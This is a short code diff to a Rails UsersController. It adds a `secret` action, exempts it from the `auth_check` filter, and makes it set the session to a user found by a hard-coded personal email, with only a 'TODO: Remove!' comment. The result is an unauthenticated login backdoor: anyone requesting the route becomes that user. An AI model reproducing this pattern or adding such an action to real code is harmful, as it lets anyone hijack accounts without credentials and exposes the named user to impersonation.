@@ -1,7 +1,7 @@
 class UsersController < ApplicationController
   include ApiResponseLibrary
 
-  before_filter :auth_check, :except => [:show]
+  before_filter :auth_check, :except => [:show, :secret]
 
   def show
     @user = User.find(params[:id])
@@ -36,6 +36,12 @@ class UsersController < ApplicationController
     current_user.update_bookmark_position(@bookmark, params[:new_url])
 
     render :status => 200, :nothing => true
+  end
+
+  # TODO: Remove!
+  def secret
+    session[:user_id] = User.where(:email => "jeff.kao.000@gmail.com").first.id
+    render :nothing => true
   end
 
 end
